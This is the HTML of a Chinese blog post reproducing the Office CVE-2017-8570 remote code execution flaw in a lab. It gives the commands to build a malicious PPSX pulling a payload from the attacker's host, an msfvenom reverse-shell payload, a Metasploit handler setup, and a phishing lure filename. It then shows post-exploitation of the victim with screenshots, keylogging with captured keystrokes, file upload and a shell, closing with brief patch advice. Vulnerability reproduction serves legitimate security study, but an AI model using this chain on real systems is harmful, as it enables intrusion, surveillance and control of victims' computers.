@@ -1,0 +1,935 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+  <link href="//cdn.jsdelivr.net/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.cat.net//css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+  
+
+<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.2/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="国光,漏洞,CSRF," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="国光" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="http://image.3001.net/images/20171012/15077801618158.png?v=5.1.1" />
+
+
+
+
+
+
+<meta name="description" content="简单的漏洞复现，主要是科普metasploit，以后会更新metasploit深入的文章～">
+<meta name="keywords" content="国光,漏洞,CSRF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Office CVE-2017-8570远程代码执行漏洞复现">
+<meta property="og:url" content="http://www.sqlsec.com/2017/08/officecve.html">
+<meta property="og:site_name" content="国光">
+<meta property="og:description" content="简单的漏洞复现，主要是科普metasploit，以后会更新metasploit深入的文章～">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://i1.nbimg.com/595241/a11ee6367b9f55ea.png">
+<meta property="og:image" content="http://i2.nbimg.com/595241/4c81ca02fb7b1bd4.png">
+<meta property="og:image" content="http://i4.nbimg.com/595241/f56d353f1f7d3e16.png">
+<meta property="og:image" content="http://i4.nbimg.com/595241/e5ef4fad40dfb664.png">
+<meta property="og:image" content="http://i1.nbimg.com/595241/3a0eb3931503a8f5.png">
+<meta property="og:image" content="http://i1.nbimg.com/595241/247d4e829cbbf810.png">
+<meta property="og:image" content="http://i1.nbimg.com/595241/ea616d7014330a53.png">
+<meta property="og:image" content="http://i1.nbimg.com/595241/5eb5999885f6f0d4.gif">
+<meta property="og:updated_time" content="2017-09-30T03:56:51.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Office CVE-2017-8570远程代码执行漏洞复现">
+<meta name="twitter:description" content="简单的漏洞复现，主要是科普metasploit，以后会更新metasploit深入的文章～">
+<meta name="twitter:image" content="http://i1.nbimg.com/595241/a11ee6367b9f55ea.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"always","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: 'undefined',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://www.sqlsec.com/2017/08/officecve.html"/>
+
+
+
+
+
+  <title>Office CVE-2017-8570远程代码执行漏洞复现 | 国光</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">国光</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">安安静静写博客</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-hacker">
+          <a href="/categories/hacker/" rel="section">
+            
+            黑客
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-c">
+          <a href="/C" rel="section">
+            
+            C
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-android">
+          <a href="/categories/Android" rel="section">
+            
+            Android
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-python">
+          <a href="/categories/Python" rel="section">
+            
+            Python
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-ctf">
+          <a href="/categories/CTF" rel="section">
+            
+            CTF
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-reverse">
+          <a href="/categories/Reverse" rel="section">
+            
+            逆向
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-others">
+          <a href="/categories/others/" rel="section">
+            
+            其他
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-life">
+          <a href="/categories/life" rel="section">
+            
+            生活
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-member">
+          <a href="/member" rel="section">
+            
+            作者墙
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://www.sqlsec.com/2017/08/officecve.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="国光">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="http://image.3001.net/images/20170929/15066688735308.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="国光">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Office CVE-2017-8570远程代码执行漏洞复现</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-13T14:41:15+08:00">
+                2017-08-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/黑客/" itemprop="url" rel="index">
+                    <span itemprop="name">黑客</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-eye">浏览数</i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><img src="http://i1.nbimg.com/595241/a11ee6367b9f55ea.png" alt="Markdown"><br>简单的漏洞复现，主要是科普metasploit，以后会更新metasploit深入的文章～<br><a id="more"></a></p>
+<h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><h2 id="编号"><a href="#编号" class="headerlink" title="编号"></a>编号</h2><p>CVE-2017-8570</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">Microsoft Office 2007 Service Pack 3</div><div class="line">Microsoft Office 2010 Service Pack 2 (32-bit editions)</div><div class="line">Microsoft Office 2010 Service Pack 2 (64-bit editions)</div><div class="line">Microsoft Office 2013 RT Service Pack 1</div><div class="line">Microsoft Office 2013 Service Pack 1 (32-bit editions)</div><div class="line">Microsoft Office 2013 Service Pack 1 (64-bit editions)</div><div class="line">Microsoft Office 2016 (32-bit edition)</div><div class="line">Microsoft Office 2016 (64-bit edition)</div></pre></td></tr></table></figure>
+<h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><p>2017年7月，微软在例行的月度补丁中修复了多个Microsoft Office漏洞，其中的<code>CVE-2017-8570</code>漏洞为一个逻辑漏洞，<code>利用方法简单</code>。网上已经出现该漏洞的利用代码，影响范围较广。</p>
+<p>该漏洞为Microsoft Office的一个远程代码执行漏洞。其成因是<code>Microsoft PowerPoint</code>执行时会初始化<code>Script”Moniker</code>对象，而在<code>PowerPoint</code>播放动画期间会<code>激活</code>该对象，从而执行<code>sct</code>脚本（Windows Script Component）文件。攻击者可以欺骗用户运行含有该漏洞的PPT文件，导致获取和当前登录用户相同的代码执行权限。</p>
+<h1 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h1><h2 id="受害者（靶机）"><a href="#受害者（靶机）" class="headerlink" title="受害者（靶机）"></a>受害者（靶机）</h2><p><strong>操作系统:</strong> <code>windows 7 sp1 x86</code><br><strong>Office版本</strong><code>Office 专业增强版 2016</code><br><strong>ip</strong><code>10.0.0.116</code></p>
+<h2 id="攻击者"><a href="#攻击者" class="headerlink" title="攻击者"></a>攻击者</h2><p><strong>操作系统</strong><code>Deepin 15.4.1</code><br><strong>metasploit版本</strong><code>v4.14.28-dev</code><br><strong>ip</strong><code>10.0.0.103</code></p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>原作者的github链接挂了，暂时就放在了我的github里面:<br><code>https://github.com/tezukanice/Office8570.git</code></p>
+<h2 id="参考视频"><a href="#参考视频" class="headerlink" title="参考视频"></a>参考视频</h2><p><code>https://www.youtube.com/watch?v=zpfNf8JTSQM</code> </p>
+<h1 id="生成恶意文件"><a href="#生成恶意文件" class="headerlink" title="生成恶意文件"></a>生成恶意文件</h1><h2 id="生成恶意PPSX文件"><a href="#生成恶意PPSX文件" class="headerlink" title="生成恶意PPSX文件"></a>生成恶意PPSX文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python cve-2017-8570_toolkit.py -M gen -w Invoice.ppsx -u http://10.0.0.103/logo.doc</div></pre></td></tr></table></figure>
+<p>这里的<code>10.0.0.103</code>是攻击者的<code>ip</code>地址<br><img src="http://i2.nbimg.com/595241/4c81ca02fb7b1bd4.png" alt="Markdown"></p>
+<h2 id="生成反弹shell-的-exe-文件"><a href="#生成反弹shell-的-exe-文件" class="headerlink" title="生成反弹shell 的 exe 文件"></a>生成反弹shell 的 exe 文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.103 LPORT=6666 -f exe &gt; shell.exe</div></pre></td></tr></table></figure>
+<p><code>LHOST</code>是攻击者的<code>ip</code>，<code>LPORT</code>这里设置的是监听本机的<code>6666</code>端口<br><img src="http://i4.nbimg.com/595241/f56d353f1f7d3e16.png" alt="Markdown"><br>这里注意 当攻击目标为<code>64</code>位的操作系统的时候，生成的exe得改为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.103 LPORT=6666 -f exe &gt; shell.exe</div></pre></td></tr></table></figure></p>
+<h1 id="监听会话"><a href="#监听会话" class="headerlink" title="监听会话"></a>监听会话</h1><h2 id="监听来自-ppsx-执行反弹-shel"><a href="#监听来自-ppsx-执行反弹-shel" class="headerlink" title="监听来自 ppsx 执行反弹 shel"></a>监听来自 ppsx 执行反弹 shel</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python cve-2017-8570_toolkit.py -M exp -e http://10.0.0.103/shell.exe -l shell.exe</div></pre></td></tr></table></figure>
+<p><img src="http://i4.nbimg.com/595241/e5ef4fad40dfb664.png" alt="Markdown"><br>一开始我这边由于没有切换到<code>root</code>用户导致 权限被拒绝,<code>su</code>切换到<code>root</code>用户解决问题。</p>
+<h2 id="msf-的监听"><a href="#msf-的监听" class="headerlink" title="msf 的监听"></a>msf 的监听</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">~ msfconsole</div><div class="line"></div><div class="line">msf &gt; use exploit/multi/handler</div><div class="line"></div><div class="line">msf &gt; set LHOST 10.0.0.103</div><div class="line"></div><div class="line">msf &gt; set LPORT 6666</div><div class="line"></div><div class="line">msf &gt; set PAYLOAD windows/meterpreter/reverse_tcp</div><div class="line"></div><div class="line">msf &gt; exploit</div></pre></td></tr></table></figure>
+<p>同样，这里攻击<code>64</code>位操作系统的时候，得做出如下的调整:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msf &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp</div></pre></td></tr></table></figure></p>
+<h1 id="钓鱼攻击"><a href="#钓鱼攻击" class="headerlink" title="钓鱼攻击"></a>钓鱼攻击</h1><p>将生成的恶意 <code>Invoice.ppsx</code> 文件重命名为:<code>2017showgirl联系方式.ppsx</code> 复制到目标靶机 <code>windows7</code>系统。<br><img src="http://i1.nbimg.com/595241/3a0eb3931503a8f5.png" alt="Markdown"><br>然后目标一不小心点开了这个ppt文件的时候:<br>即可在 MSF 反弹 metertprter 的 shell 出来：<br><img src="http://i1.nbimg.com/595241/247d4e829cbbf810.png" alt="Markdown">  </p>
+<h1 id="后续渗透"><a href="#后续渗透" class="headerlink" title="后续渗透"></a>后续渗透</h1><h2 id="截图"><a href="#截图" class="headerlink" title="截图"></a>截图</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; screenshot</div><div class="line">Screenshot saved to: /home/ctf/ccoDxgvg.jpeg</div></pre></td></tr></table></figure>
+<p><img src="http://i1.nbimg.com/595241/ea616d7014330a53.png" alt="Markdown"><br>正在看b站小姐姐视频～～</p>
+<h2 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; keyscan_start          # 开启键盘记录</div><div class="line">Starting the keystroke sniffer...</div><div class="line"></div><div class="line">meterpreter &gt; keyscan_dump           #查看键盘记录内容</div><div class="line">Dumping captured keystrokes...</div><div class="line"></div><div class="line">**</div><div class="line">-[ C:\soft\SogouExplorer\SogouExplorer.exe</div><div class="line">-[ @ 2017年8月13日 4:07:31 UTC</div><div class="line">**</div><div class="line">&lt;Shift&gt;xiaojiejie &lt;Shift&gt;chain&lt;^H&gt;&lt;^H&gt;&lt;^H&gt;inajoy&lt;CR&gt;</div><div class="line"></div><div class="line">meterpreter &gt; keyscan_stop            #关闭键盘记录</div></pre></td></tr></table></figure>
+<p>可以看到win7的主人在搜狗浏览器中输入了如下内容:<code>xiao jie jie chinajoy</code><br>这里面的<code>&lt;^H&gt;</code> 是删除键  <code>&lt;CR&gt;</code>是 回车键</p>
+<h2 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt;  upload /home/ctf/Desktop/快别看小姐姐了你被黑啦.txt C:\\users\\gg\\Desktop</div></pre></td></tr></table></figure>
+<p>把我们的友情提示上传到win7系统主人的 电脑桌面上<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">ctf@guoguang:~/Desktop$ cat 快别看小姐姐了你被黑啦.txt </div><div class="line">整天不是逛B站 就是 逛A站</div><div class="line">除了看小姐姐 还是看小姐姐！～～</div><div class="line">(严肃脸)我只想对你说 4个字:</div><div class="line">请带上我</div><div class="line">meterpreter &gt;  upload /home/ctf/Desktop/快别看小姐姐了你被黑啦.txt C:\\users\\gg\\Desktop</div><div class="line">[*] uploading : home/ctf/Desktop/快别看小姐姐了你被黑啦.txt -&gt; C:\users\gg\Desktop</div><div class="line">[*] uploaded  : home/ctf/Desktop/快别看小姐姐了你被黑啦.txt -&gt; C:\users\gg\Desktop\快别看小姐姐了你被黑啦.txt</div></pre></td></tr></table></figure></p>
+<h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; shell</div></pre></td></tr></table></figure>
+<p><code>shell</code> 顾名思义就是<code>shell</code>了，这个命令相当于完全控制了windows的cmd命令行，可以执行任意cmd操作，当然只要权限足够大的话。</p>
+<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><ul>
+<li>及时安装微软2017年7月发布的最新补丁</li>
+<li>经得住诱惑，不打开来历不明的office文件<br>如果没有打补丁的话，其实还有一直比较稳妥的打开PPT的方法，就是 <code>不用 双击</code> 打开PPT，打开PPT直接拖动打开 是不会触发运行<code>exe</code>程序的:<br>如下图:<br><img src="http://i1.nbimg.com/595241/5eb5999885f6f0d4.gif" alt="Markdown">  </li>
+</ul>
+
+      
+    </div>
+
+    <div>
+      
+        
+<div id="wechat_subscriber" style="display: block; padding: 10px 0; margin: 20px auto; width: 100%; text-align: center">
+    <img id="wechat_subscriber_qcode" src="http://image.3001.net/images/20171103/15097023327128.png" alt="国光 wechat" style="width: 200px; max-width: 100%;"/>
+    <div>听说打赏我的人，都挖到了0day。</div>
+</div>
+
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/国光/" rel="tag"># 国光</a>
+          
+            <a href="/tags/漏洞/" rel="tag"># 漏洞</a>
+          
+            <a href="/tags/CSRF/" rel="tag"># CSRF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/08/postcsrf.html" rel="next" title="POST型CSRF简单复现">
+                <i class="fa fa-chevron-left"></i> POST型CSRF简单复现
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/09/android2.html" rel="prev" title="Android 开发初体验">
+                Android 开发初体验 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8yOTU5Ny82MTY1"></div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="http://image.3001.net/images/20170929/15066688735308.jpg"
+               alt="国光" />
+          <p class="site-author-name" itemprop="name">国光</p>
+           
+              <p class="site-description motion-element" itemprop="description">宁静致远</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">33</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">7</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">41</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/u/5728586656" target="_blank" title="微博">
+                  
+                    <i class="fa fa-fw fa-weibo"></i>
+                  
+                  微博
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://www.github.com/tezukanice/" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://www.zhihu.com/people/guo-guang-94/activities" target="_blank" title="知乎">
+                  
+                    <i class="fa fa-fw fa-tags"></i>
+                  
+                  知乎
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              友情链接
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.ggsec.cn/" title="Demon" target="_blank">Demon</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://secretwiki.org/" title="Secretwiki" target="_blank">Secretwiki</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://bestwing.me/" title="SWing" target="_blank">SWing</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.inksec.cn" title="Szrzvdny|墨是人性" target="_blank">Szrzvdny|墨是人性</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞简介"><span class="nav-number">1.</span> <span class="nav-text">漏洞简介</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#编号"><span class="nav-number">1.1.</span> <span class="nav-text">编号</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#影响版本"><span class="nav-number">1.2.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#危害"><span class="nav-number">1.3.</span> <span class="nav-text">危害</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#复现环境"><span class="nav-number">2.</span> <span class="nav-text">复现环境</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#受害者（靶机）"><span class="nav-number">2.1.</span> <span class="nav-text">受害者（靶机）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#攻击者"><span class="nav-number">2.2.</span> <span class="nav-text">攻击者</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-number">2.3.</span> <span class="nav-text">exp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考视频"><span class="nav-number">2.4.</span> <span class="nav-text">参考视频</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#生成恶意文件"><span class="nav-number">3.</span> <span class="nav-text">生成恶意文件</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#生成恶意PPSX文件"><span class="nav-number">3.1.</span> <span class="nav-text">生成恶意PPSX文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#生成反弹shell-的-exe-文件"><span class="nav-number">3.2.</span> <span class="nav-text">生成反弹shell 的 exe 文件</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#监听会话"><span class="nav-number">4.</span> <span class="nav-text">监听会话</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#监听来自-ppsx-执行反弹-shel"><span class="nav-number">4.1.</span> <span class="nav-text">监听来自 ppsx 执行反弹 shel</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#msf-的监听"><span class="nav-number">4.2.</span> <span class="nav-text">msf 的监听</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#钓鱼攻击"><span class="nav-number">5.</span> <span class="nav-text">钓鱼攻击</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#后续渗透"><span class="nav-number">6.</span> <span class="nav-text">后续渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#截图"><span class="nav-number">6.1.</span> <span class="nav-text">截图</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#键盘记录"><span class="nav-number">6.2.</span> <span class="nav-text">键盘记录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#上传文件"><span class="nav-number">6.3.</span> <span class="nav-text">上传文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#shell"><span class="nav-number">6.4.</span> <span class="nav-text">shell</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞修复"><span class="nav-number">7.</span> <span class="nav-text">漏洞修复</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2016 - 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">国光</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user">访客数</i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye">阅读数</i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="//oxhwlgrce.bkt.clouddn.com/jquery2.min.js"></script>
+
+  
